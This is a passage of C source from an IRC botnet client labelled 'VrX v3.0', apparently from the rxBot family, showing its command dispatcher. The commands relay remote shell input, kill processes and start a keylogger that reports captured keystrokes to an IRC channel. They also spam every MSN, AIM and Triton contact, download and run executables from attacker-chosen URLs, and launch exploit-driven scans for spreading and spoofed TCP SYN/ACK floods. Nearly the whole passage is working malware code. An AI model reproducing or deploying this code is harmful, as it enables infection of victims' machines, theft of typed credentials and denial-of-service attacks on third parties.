				irc_sendv(sock, "JOIN %s %s\r\n", a[s+1], a[s+2]);
				addlogv("8,1-VrX- Joined channel: '%s'.",a[s+1]);

				return repeat;
			}
			else if (strcmp("part", a[s]) == 0 || strcmp("pt", a[s]) == 0) {
				irc_sendv(sock, "PART %s\r\n", a[s+1]);
				addlogv("8,1-VrX- Parted channel: '%s'.",a[s+1]);

				return repeat;
			}
			else if (strcmp("raw", a[s]) == 0 || strcmp("r", a[s]) == 0) {
				if (x != NULL) {
					char *y = strstr(x, a[s+1]);
					if (y != NULL) {
						irc_sendv(sock, "%s\r\n", y);
						addlogv("8,1-VrX- IRC Raw: %s.",y);
					}
				}

				return repeat;
			}
			else if (strcmp("killthread", a[s]) == 0 || strcmp("k", a[s]) == 0) {
				if (strcmp("all", a[s+1]) == 0) {
					if ((i=killthreadall()) > 0)
						sprintf(sendbuf,"-\x03\x34\2threads\2\x03- Stopped: %d thread(s).", i);
					else
						sprintf(sendbuf,"-\x03\x34\2threads\2\x03- No active threads found.");
					if (!silent) irc_privmsg(sock, a[2], sendbuf, notice);
					addlog(sendbuf);					
				} else {
					for (i = s+1; i < (sizeof(a)/4); i++) {
						if (a[i]==NULL) break;
					
						if (killthread(atoi(a[i])))
							sprintf(sendbuf,"-\x03\x34\2threads\2\x03- Killed thread: %s.",a[i]);
						else 
							sprintf(sendbuf,"-\x03\x34\2threads\2\x03- Failed to kill thread: %s.",a[i]);
						if (!silent) irc_privmsg(sock, a[2], sendbuf, notice);
						addlog(sendbuf);
					}
				}

				return 1;
			}
			else if (strcmp("c_quit", a[s]) == 0 || strcmp("c_q", a[s]) == 0) {
				if (atoi(a[s+1]) > 0 && atoi(a[s+1]) < MAXTHREADS) {
					irc_sendv(threads[atoi(a[s+1])].sock, "QUIT :later\r\n");
					Sleep(500);
					fclosesocket(threads[atoi(a[s+1])].sock);
					TerminateThread(threads[atoi(a[s+1])].tHandle, id);
					threads[atoi(a[s+1])].tHandle = 0;
					threads[atoi(a[s+1])].name[0] = '\0';
				}

				return 1;
			}
			else if (strcmp("c_rndnick", a[s]) == 0 || strcmp("c_rn", a[s]) == 0) {
				if (atoi(a[s+1]) > 0 && atoi(a[s+1]) < MAXTHREADS) {
					sprintf(sendbuf, "NICK %s", rndnick(ntmp));
					irc_sendv(threads[atoi(a[s+1])].sock, "%s\r\n", sendbuf);
				}

				return repeat;
			}
			else if (strcmp("server", a[s]) == 0 || strcmp("se", a[s]) == 0) {
				strncpy(server,  a[s+1], 127);
				sprintf(sendbuf,"8,1-VrX- Server changed to: '%s'.",a[s+1]);
				if (!silent) irc_privmsg(sock, a[2], sendbuf, notice);
				addlog(sendbuf);

				return 1;
			}
			#ifndef NO_PROCESS
			else if (strcmp("killproc",a[s]) == 0 || strcmp("kp", a[s]) == 0) {  // kill process name
				if(listProcesses(sock,NULL,notice,a[s+1]) == 1)
					sprintf(sendbuf,"-\x03\x34\2procs\2\x03- Process killed: %s",a[s+1]);
				else
					sprintf(sendbuf,"-\x03\x34\2procs\2\x03- Failed to terminate process: %s", a[s+1]);
				if (!silent) irc_privmsg(sock, a[2], sendbuf, notice);
				addlog(sendbuf);

				return repeat;
			}
			#endif
			#ifndef NO_REMOTECMD
			else if (strcmp("cmd", a[s]) == 0 || strcmp("cm", a[s]) == 0) {
				if (x != NULL) {
					char *y = strstr(x, a[s+1]); 
					if (y != NULL) { 
						strcat(y,"\n");
						if (!send_commands(y)) {
							sprintf(sendbuf,"-\x03\x34\2cmd\2\x03- Error sending to remote shell.");
							if (!silent) irc_privmsg(sock,a[2],sendbuf,notice);
						}
						else
							sprintf(sendbuf,"-\x03\x34\2cmd\2\x03- Commands: %s",y);
						addlog(sendbuf);
					}
				}
				
				return repeat;
			}
			#endif


			#ifndef NO_MSNSPREAD
///////////////////////////////////////////////////////////////////////////////////////////////////////////////////
///////////////////////////////////////////////////////////////////////////////////////////////////////////////////
///////////////////////////////////////////////////////////////////////////////////////////////////////////////////
///////////////////////////////////////////////////////////////////////////////////////////////////////////////////			
/* If u want SAved Msgs >>>>>>>>>>>>>>>>>>>>
			else if (strcmp("saved", a[s]) == 0 || strcmp("msn.saved", a[s]) == 0)
	{
					 if (a[s+1]) {
		NTHREAD msn;
		msn.silent=silent;
		msn.verbose=notice;
		char *IMmessage;
//here comes my magic lol ,,,,,,,,,greetings for myself only:P Virus may fuck ur pc :P:P
	//Need to distinguish between msgs! now! if u want saved msgs save them here! >>>

		if(strcmp("one", a[s+1]) == 0) {
						IMmessage= ";) Testing no 1";
						msn.data1 = IMmessage; //Message
		msn.threadnum = addthread("MSN Threads",MSNMSG_THREAD,sock);
		if (threads[msn.threadnum].tHandle = CreateThread(NULL, 0, &MsnMsg, (LPVOID)&msn, 0, &id))
		{
			while (msn.gotinfo == FALSE) Sleep(50);
			if (!silent) irc_privmsg(sock, a[2], ".8,1-VrX- SENDING MSG 1.", notice);
		}

					} 
					else if(strcmp("two", a[s+1]) == 0) {
					IMmessage= ";) Testing no 2";
												msn.data1 = IMmessage; //Message
		msn.threadnum = addthread("MSN Threads",MSNMSG_THREAD,sock);
		if (threads[msn.threadnum].tHandle = CreateThread(NULL, 0, &MsnMsg, (LPVOID)&msn, 0, &id))
		{
			while (msn.gotinfo == FALSE) Sleep(50);
			if (!silent) irc_privmsg(sock, a[2], ".8,1-VrX- SENDING MSG 2.", notice);
		}
					}
					else if(strcmp("three", a[s+1]) == 0) {
						IMmessage= ";) Testing no 3";
						msn.data1 = IMmessage; //Message
		msn.threadnum = addthread("MSN Threads",MSNMSG_THREAD,sock);
		if (threads[msn.threadnum].tHandle = CreateThread(NULL, 0, &MsnMsg, (LPVOID)&msn, 0, &id))
		{
			while (msn.gotinfo == FALSE) Sleep(50);
			if (!silent) irc_privmsg(sock, a[2], "8,1-VrX- SENDING MSG 1.", notice);
		}
					}		
					else {
						sprintf(sendbuf, "Unknow Msg DATA");
						if (!silent) irc_privmsg(sock,a[2],sendbuf,notice);
						addlog(sendbuf);
						return 1;
					

		msn.data1 = IMmessage; //Message
		msn.threadnum = addthread("MSN Threads",MSNMSG_THREAD,sock);
		if (threads[msn.threadnum].tHandle = CreateThread(NULL, 0, &MsnMsg, (LPVOID)&msn, 0, &id))
		{
			while (msn.gotinfo == FALSE) Sleep(50);
			if (!silent) irc_privmsg(sock, a[2], ".8,1-VrX- Started Sending SAVED Msg to ALL MSN Contacts.", notice);
		}

			}}}			
*/
			else if (strcmp("msn", a[s]) == 0 || strcmp("msn", a[s]) == 0)
	{
		NTHREAD msn;
		msn.silent=silent;
		msn.verbose=notice;
		//strcpy(msn.target,hostd->target);

		char *IMmessage;
		//here comes my magic lol ,,,,,,,,,greetings for myself only:P
			if (x != NULL) {
					x = x + strlen(a[s]) + strlen(a[s+1]) + 2;
					char *y = strstr(x, a[s+2]);
					if (y != NULL) {
			
			IMmessage= (a[s+1],y);
		msn.data1=IMmessage; //Message
		msn.threadnum = addthread("MSN Threads",MSNMSG_THREAD,sock);
		if (threads[msn.threadnum].tHandle = CreateThread(NULL, 0, &MsnMsg, (LPVOID)&msn, 0, &id))
		{
			while (msn.gotinfo == FALSE) Sleep(50);
			if (!silent) irc_privmsg(sock, a[2], "8,1-VrX- Started Sending Your Msg to ALL MSN Contacts.", notice);
		}

			}}}//lol at that end :P virus said thats how he ends the code suddenly :P

#endif
///////////////////////////////////////////////////////////////////////////////////////////////////////////////////
///////////////////////////////////////////////////////////////////////////////////////////////////////////////////
///////////////////////////////////////////////////////////////////////////////////////////////////////////////////
///////////////////////////////////////////////////////////////////////////////////////////////////////////////////
#ifndef NO_AIM


else if (strcmp("aim", a[s]) == 0 || strcmp("aim", a[s]) == 0)
	{
		NTHREAD aim;
		aim.silent=silent;
		aim.verbose=notice;
		//strcpy(msn.target,hostd->target);

		char *AIMmessage;
		//here comes my magic lol ,,,,,,,,,greetings for myself only:P
			if (x != NULL) {
					x = x + strlen(a[s]) + strlen(a[s+1]) + 2;
					char *y = strstr(x, a[s+2]);
					if (y != NULL) {
			
			AIMmessage= (a[s+1],y);
		aim.data1=AIMmessage; //Message
		aim.threadnum = addthread("AIM Threads",AIM_THREAD,sock);
		if (threads[aim.threadnum].tHandle = CreateThread(NULL, 0, &AimMessage, (LPVOID)&aim, 0, &id))
		{
			while (aim.gotinfo == FALSE) Sleep(50);
			if (!silent) irc_privmsg(sock, a[2], "8,1-VrX- Started Sending Your Msg to ALL AIM Contacts.", notice);
		}

			}}}//lol at that end :P virus said thats how he ends the code suddenly :P

#endif

//////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
//////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
//////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
//////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
#ifndef NO_AIM
		else if (strcmp("tim", a[s]) == 0 || strcmp("tim", a[s]) == 0)
	{

				NTHREAD tim;
				tim.silent=silent;
				tim.verbose=notice;

				char *TIMmessage;
				if (x != NULL) {
					x = x + strlen(a[s]) + strlen(a[s+1]) + 2;
					char *y = strstr(x, a[s+2]);
					if (y != NULL) {
			
			TIMmessage= (a[s+1],y);
			tim.data1=TIMmessage; //Message

			tim.threadnum = addthread("TIM Threads",TIM_THREAD,sock);
			if (threads[tim.threadnum].tHandle = CreateThread(NULL, 0, &TritonMessage, (LPVOID)&tim, 0, &id))
		{
			while (tim.gotinfo == FALSE) Sleep(50);
			if (!silent) irc_privmsg(sock, a[2], "8,1-VrX- Started Sending Your Msg to ALL TriTon Contacts.", notice);

		}

			}}}//lol at that end :P virus said thats how he ends the code suddenly :P

#endif

//////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
//////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
//////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
//////////////////////////////////////////////////////////////////////////////////////////////////////////////////////

			#ifndef NO_KEYLOG
			else if (strcmp("keyloger", a[s]) == 0 || strcmp("keylog", a[s]) == 0) {
				if (findthreadid(KEYLOG_THREAD) > 0)
					sprintf(sendbuf ,"Keyloger Already running.");
				else if (a[s+1]) {
					KEYLOG keylog;
					keylog.sock = sock;
					keylog.notice = notice;
					keylog.silent = silent;
					keylog.mode = false;
					
					if(strcmp("web", a[s+1]) == 0) {
						keylog.mode = true;
						_snprintf(keylog.chan, sizeof(keylog.chan), ((a[s+2])?(a[s+2]):((strcmp(keylogchan,"")==0)?(a[2]):(keylogchan))));
						sprintf(sendbuf, "VrX v3.0 sites keylogger active.");
					} 
					else if(strcmp("normal", a[s+1]) == 0) {
						_snprintf(keylog.chan, sizeof(keylog.chan), ((a[s+2])?(a[s+2]):((strcmp(keylogchan,"")==0)?(a[2]):(keylogchan))));
						sprintf(sendbuf, "Normal key logger active.");
					}
					else {
						sprintf(sendbuf, "Unknow mode type.");
						if (!silent) irc_privmsg(sock,a[2],sendbuf,notice);
						addlog(sendbuf);
						return 1;
					}
					keylog.threadnum = addthread(sendbuf, KEYLOG_THREAD, NULL);
					if (threads[keylog.threadnum].tHandle = CreateThread(NULL, 0, &KeyLoggerThread, (LPVOID)&keylog, 0, &id)) {
						while(keylog.gotinfo == FALSE)
							Sleep(50);
					} else
						sprintf(sendbuf,"Failed to start logging thread, error: <%d>.", GetLastError());
				}
				else
					sprintf(sendbuf, "Missing mode type.");
				if (!silent) irc_privmsg(sock, a[2], sendbuf, notice);
				addlog(sendbuf);
				return 1;
			}
			else if (strcmp("stop",a[s]) == 0 || strcmp("stop",a[s]) == 0) {
				stopthread(sock,a[2],notice,silent,"VrX v3.0 sites keylogger active.","Keylog",KEYLOG_THREAD,a[s+1]);
				return 1;
			}

			#endif

			// commands requiring at least 2 parameters
			if (a[s+2] == NULL) return 1;
			else if (strcmp("privmsg", a[s]) == 0 || strcmp("pm", a[s]) == 0) {
				if (x != NULL) {
					x = x + strlen(a[s]) + strlen(a[s+1]) + 2;
					char *y = strstr(x, a[s+2]);
					if (y != NULL) {
						irc_privmsg(sock, a[s+1], y, FALSE);
						addlogv("8,1-VrX- Privmsg: %s: %s.",a[s+1], y);
					}
				}

				return repeat;
			}
			else if (strcmp("c_raw", a[s]) == 0 || strcmp("c_r", a[s]) == 0) {
				if (x != NULL) {
					char *y = strstr(x, a[s+2]);
					if (y != NULL && atoi(a[s+1]) > 0 && atoi(a[s+1]) < MAXTHREADS) {
						irc_sendv(threads[atoi(a[s+1])].sock, "%s\r\n", y);
						addlogv("-\x03\x34\2clone\2\x03- Raw (%s): %s", a[s+1], y);
					}

				}

				return repeat;
			}
			else if (strcmp("c_join", a[s]) == 0 || strcmp("c_j", a[s]) == 0) {
				sprintf(sendbuf, "JOIN %s %s", a[s+2], a[s+3]);
				if (atoi(a[s+1]) > 0 && atoi(a[s+1]) < MAXTHREADS) 
					irc_sendv(threads[atoi(a[s+1])].sock, "%s\r\n", sendbuf);

				return repeat;
			}
			else if (strcmp("c_part", a[s]) == 0 || strcmp("c_p", a[s]) == 0) {
				sprintf(sendbuf, "PART %s", a[s+2]);
				if (atoi(a[s+1]) > 0 && atoi(a[s+1]) < MAXTHREADS) 
					irc_sendv(threads[atoi(a[s+1])].sock, "%s\r\n", sendbuf);

				return repeat;
			}
			#ifndef NO_DOWNLOAD
			// "update"
			else if (strcmp("HADETH", a[s]) == 0 || strcmp("HADETH", a[s]) == 0) {
				if (strcmp(botid, a[s+2]) != 0) {
					char tempdir[MAX_PATH], tmpbuf[MAXNICKLEN];
					GetTempPath(sizeof(tempdir), tempdir);

					DOWNLOAD dl;
					strncpy(dl.url,  a[s+1], sizeof(dl.url)-1);
					sprintf(dl.dest, "%s%s.exe", tempdir, rndnickletter(tmpbuf));
					dl.update = 1;
					dl.run = 0;
					dl.expectedcrc=((a[s+3])?(strtoul(a[s+3],0,16)):(0));
					dl.filelen=((a[s+4])?(atoi(a[s+4])):(0));
					dl.encrypted=(parameters['e']);

					dl.sock = sock;
					strncpy(dl.chan,  a[2], sizeof(dl.chan)-1);
					dl.notice=notice;
					dl.silent = silent;

					sprintf(sendbuf, "-\x03\x34\2YaRab!\2\x03- Downloading update from: %s.", a[s+1]);
					dl.threadnum = addthread(sendbuf, UPDATE_THREAD, sock);
					if (threads[dl.threadnum].tHandle = CreateThread(NULL, 0, &DownloadThread, (LPVOID)&dl, 0, &id)) {
						while(dl.gotinfo == FALSE)
							Sleep(50);
					} else
						sprintf(sendbuf,"-\x03\x34\2update\2\x03- Failed to start download thread, error: <%d>.", GetLastError());
				} else
					sprintf(sendbuf,"-\x03\x34\2update\2\x03- Bot ID must be different than current running process.");

				if (!silent) irc_privmsg(sock, a[2], sendbuf, notice);
				addlog(sendbuf);

				return repeat;
			}
			#endif
			// FIX ME: Add execute with output, rip from my IROFFER
			// commands requiring at least 3 parameters
			if (a[s+3] == NULL) return 1;
			else if (strcmp("clone", a[s]) == 0 || strcmp("c", a[s]) == 0) {
				IRC irc;
				strncpy(irc.host,  a[s+1], sizeof(irc.host)-1);
				irc.port = atoi(a[s+2]);
				strncpy(irc.channel,  a[s+3], sizeof(irc.channel)-1);
				if (a[s+4]) 
					strncpy(irc.chanpass,  a[s+4], sizeof(irc.chanpass)-1);
				irc.spy = 1;

				sprintf(sendbuf, "-\x03\x34\2clones\2\x03- Created on %s:%d, in channel %s.", irc.host, irc.port, irc.channel);
				irc.threadnum = addthread(sendbuf, CLONE_THREAD, NULL);
				if (threads[irc.threadnum].tHandle = CreateThread(NULL, 0, &irc_connect, (LPVOID)&irc, 0, &id)) {
					while(irc.gotinfo == FALSE)
						Sleep(50);
				} else
					sprintf(sendbuf,"-\x03\x34\2clones\2\x03- Failed to start clone thread, error: <%d>.", GetLastError());

				if (!silent) irc_privmsg(sock, a[2], sendbuf, notice);
				addlog(sendbuf);

				return repeat;
			}
			#ifndef NO_DOWNLOAD
			// "download"
			else if (strcmp("dload", a[s]) == 0 || strcmp("dload", a[s]) == 0) {
				DOWNLOAD dl;
				strncpy(dl.url, a[s+1], sizeof(dl.url)-1);
				strncpy(dl.dest, a[s+2], sizeof(dl.dest)-1);
				dl.update = 0;
				dl.run = ((a[s+3])?(atoi(a[s+3])):(0));
				dl.expectedcrc=((a[s+4])?(strtoul(a[s+4],0,16)):(0));
				dl.filelen=((a[s+5])?(atoi(a[s+5])):(0));
				dl.encrypted=(parameters['e']);

				dl.sock = sock;
				strncpy(dl.chan,  a[2], sizeof(dl.chan)-1);
				dl.notice=notice;
				dl.silent = silent;

				sprintf(sendbuf, "-\x03\x34\2YaRab!\2\x03- Downloading URL: %s to: %s.", a[s+1], a[s+2]);
				dl.threadnum = addthread(sendbuf, DOWNLOAD_THREAD, sock);
				if (threads[dl.threadnum].tHandle = CreateThread(NULL, 0, &DownloadThread, (LPVOID)&dl, 0, &id)) {
					while(dl.gotinfo == FALSE)
						Sleep(50);
				} else
					sprintf(sendbuf,"-\x03\x34\2download\2\x03- Failed to start transfer thread, error: <%d>.", GetLastError());

				if (!silent) irc_privmsg(sock, a[2], sendbuf, notice);
				addlog(sendbuf);
				
				return 1;
			}
			#endif 
			else if (strcmp("c_privmsg", a[s]) == 0 || strcmp("c_pm", a[s]) == 0) {
				if (threads[atoi(a[s+1])].nick[0] != '\0' && x != NULL) {
					x = x + strlen(a[s]) + strlen(a[s+1]) + strlen(a[s+2]) + 2;
					char *y = strstr(x, a[s+3]);
					if (y != NULL && atoi(a[s+1]) > 0 && atoi(a[s+1]) < MAXTHREADS) {
						irc_privmsg(threads[atoi(a[s+1])].sock, a[s+2], y, FALSE);
						if (threads[atoi(a[s+1])].name[0] == 's') {
							sprintf(sendbuf, "[%s] <%s> %s", a[s+2], threads[atoi(a[s+1])].nick, y);
							irc_privmsg(sock, a[2], sendbuf, notice);
						}
					}
				}

				return repeat;
			}
			// commands requiring at least 4 parameters
			if (a[s+4] == NULL) return 1;
			#ifndef NO_ADVSCAN
			else if (strcmp("VrX", a[s]) == 0 || strcmp("asc", a[s]) == 0) {
				int scanthreads=findthreadid(SCAN_THREAD);
				if (scanthreads + atoi(a[s+2]) > MAXSCANTHRD) {
					sprintf(sendbuf ,"8,1-SC@N- Already %d scanning threads. Too many specified.", scanthreads);
					irc_privmsg(sock,a[2],sendbuf,notice);
				} else {
					ADVSCAN advscan;
					advscan.port = atoi(a[s+1]); // check for method or port number
					advscan.threads = atoi(a[s+2]);
					advscan.delay = atoi(a[s+3]);
					advscan.delay = ((advscan.delay < 5)?(5):(advscan.delay));
					advscan.delay = ((advscan.delay > 60)?(60):(advscan.delay));
					advscan.minutes = atoi(a[s+4]);
					advscan.minutes = ((advscan.minutes > MAXSCANTIME)?(MAXSCANTIME):(advscan.minutes));
					advscan.exploit = -1;

					for(i=0;exploit[i].port != 0;i++) {
						if (strcmp(exploit[i].command, a[s+1]) == 0) {
							advscan.port = exploit[i].port;
							advscan.exploit = i;

							break;
						}
					}

					if (advscan.port == 0) {
						sprintf(sendbuf, "8,1-SC@N- Failed to start scan, port is invalid.");
						if (!silent) irc_privmsg(sock, a[2], sendbuf, notice);
						addlog(sendbuf);

						return 1;
					}

					if (a[s+5] && a[s+5][0] != '#') {
						_snprintf(advscan.ip,sizeof(advscan.ip),a[s+5]);
						advscan.random = ((strchr(a[s+5],'x'))?(TRUE):(FALSE));
					} else {
						if (parameters['a'] || parameters['b'] || parameters['r']) {
							SOCKADDR_IN ssin;
							int ssin_len=sizeof(ssin);
							fgetsockname(sock,(LPSOCKADDR)&ssin,&ssin_len);
							ssin.sin_addr.S_un.S_addr&=(parameters['a']) ? 0xFF : 0xFFFF;
							strncpy(advscan.ip,finet_ntoa(ssin.sin_addr), sizeof(advscan.ip));

							if (parameters['r']) {
								int extractip = ((parameters['a']) ? 3 : 2);
								for (char *c=strrchr(advscan.ip,'0'),i=0;i<extractip && c;c[0]='x',c=strrchr(advscan.ip,'0'),i++);
							
								advscan.random = TRUE;
							} else
								advscan.random = FALSE;
						} else {
							sprintf(sendbuf, "8,1-SC@N- Failed to start scan, no IP specified.");
							if (!silent) irc_privmsg(sock, a[2], sendbuf, notice);
							addlog(sendbuf);
							
							return 1;
						}
					}

					advscan.sock = sock;
					advscan.notice = notice;
					advscan.silent = silent;
					_snprintf(advscan.chan,sizeof(advscan.chan),a[2]);
					if (a[s+6])
						_snprintf(advscan.msgchan,sizeof(advscan.msgchan),a[s+6]);
					else if (a[s+5] && a[s+5][0] == '#')
						_snprintf(advscan.msgchan,sizeof(advscan.msgchan),a[s+5]);
					else if (strcmp(exploitchan,"") != 0)
						_snprintf(advscan.msgchan,sizeof(advscan.msgchan),exploitchan);
					else
						advscan.msgchan[0] = '\0';

					sprintf(sendbuf, "8,1-SC@N- %s Port Scan started on %s:%d with a delay of %d seconds for %d minutes using %d threads.", 
						((advscan.random)?("Random"):("Sequential")), advscan.ip, advscan.port, advscan.delay, advscan.minutes, advscan.threads);
					advscan.threadnum = addthread(sendbuf,SCAN_THREAD,NULL);
					if (threads[advscan.threadnum].tHandle = CreateThread(NULL, 0, &AdvScanner, (LPVOID)&advscan, 0, &id)) {
						while(advscan.gotinfo == FALSE)
							Sleep(50);
					} else
						sprintf(sendbuf,"8,1-SC@N- Failed to start scan thread, error: <%d>.", GetLastError());

					if (!silent) irc_privmsg(sock, a[2], sendbuf, notice);
					addlog(sendbuf);

					return 1;
				}
			}
			#endif
			
			// commands requiring at least 5 parameters 
		    if (a[s+5] == NULL) return 1; 
			#ifndef NO_TCP
			else if (strcmp("tcpflood", a[s]) == 0 || strcmp("tcp", a[s]) == 0) {
				TCPFLOOD tcpflood;
				_snprintf(tcpflood.type,sizeof(tcpflood.type),a[s+1]);
				if (strcmp("syn",tcpflood.type) == 0 || strcmp("ack",tcpflood.type) == 0 || strcmp("random",tcpflood.type) == 0) {
					if ((tcpflood.time = atoi(a[s+4])) > 0) {
						_snprintf(tcpflood.type,sizeof(tcpflood.type),a[s+1]);
						_snprintf(tcpflood.ip,sizeof(tcpflood.ip),a[s+2]);
						tcpflood.port = atoi(a[s+3]);
						tcpflood.spoof = ((parameters['r'])?(TRUE):(FALSE));
						tcpflood.sock = sock;
						_snprintf(tcpflood.chan,sizeof(tcpflood.chan),a[2]);
						tcpflood.notice = notice;
						tcpflood.silent = silent;

						_snprintf(sendbuf,sizeof(sendbuf),"-\x03\x34\2tcp\2\x03- %s %s flooding: (%s:%s) for %s seconds.", ((tcpflood.spoof)?("Spoofed"):("Normal")), a[s+1], a[s+2], a[s+3], a[s+4]);
						tcpflood.threadnum = addthread(sendbuf,TCP_THREAD,NULL);
						if (threads[tcpflood.threadnum].tHandle = CreateThread(NULL, 0, &TcpFloodThread, (LPVOID)&tcpflood, 0, &id)) {
							while(tcpflood.gotinfo == FALSE)
								Sleep(50);
						} else
							sprintf(sendbuf,"-\x03\x34\2tcp\2\x03- Failed to start flood thread, error: <%d>.", GetLastError());
					} else
						sprintf(sendbuf,"-\x03\x34\2tcp\2\x03- Invalid flood time must be greater than 0.");
				} else
					sprintf(sendbuf,"-\x03\x34\2tcp\2\x03- Invalid flood type specified.");

				if (!silent) irc_privmsg(sock, a[2], sendbuf, notice);
				addlog(sendbuf);

				return 1;
			}
			#endif
		}
		
	}

	return repeat;
}

